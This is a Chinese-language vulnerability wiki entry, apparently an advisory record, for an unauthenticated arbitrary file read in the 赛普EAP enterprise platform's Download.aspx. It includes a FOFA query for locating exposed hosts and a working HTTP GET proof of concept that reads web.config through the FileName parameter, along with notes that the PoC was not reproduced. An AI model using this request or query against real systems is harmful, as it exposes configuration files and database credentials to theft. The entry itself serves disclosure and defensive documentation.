---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "赛普EAP企业适配管理平台 Download.aspx FileName文件读取"
product: "赛普EAP企业适配管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，应用相对配置路径"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%B5%9B%E6%99%AE%E8%BD%AF%E4%BB%B6/%E8%B5%9B%E6%99%AEEAP%E4%BC%81%E4%B8%9A%E9%80%82%E9%85%8D%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20Download.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"IDWebSoft/\""
fofa_unverified: "body="
id: "vw-404b3cdd16aa335baa3a3e2c"
entity_id: "ve-404b3cdd16aa335baa3a3e2c"
schema_version: "1"
---

# 赛普EAP企业适配管理平台 Download.aspx FileName文件读取

## 条目说明

- 对象与具体问题：赛普EAP企业适配管理平台；Download.aspx FileName文件读取
- 版本、配置及部署条件：版本未知，应用相对配置路径
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 单web.config例不证明任意系统路径，需定义读取边界及FileTitle语义
- 返回仅未视检截图，缺根因、版本/补丁，在野已知无来源
- HTTP无围栏，正文数据库配置重复；宜ERP/企业平台统一产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

赛普EAP企业适配管理平台 Download.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## 影响版本

赛普EAP企业适配管理平台

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="IDWebSoft/"

POC/EXP：

```http
GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
Content-Type:application/x-www-form-urlencoded
Accept: */*
Connection: Keep-Alive
```


![image-20241101121041746](./.resource/赛普EAP企业适配管理平台Download.aspx任意文件读取漏洞/media/image-20241101121041746.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
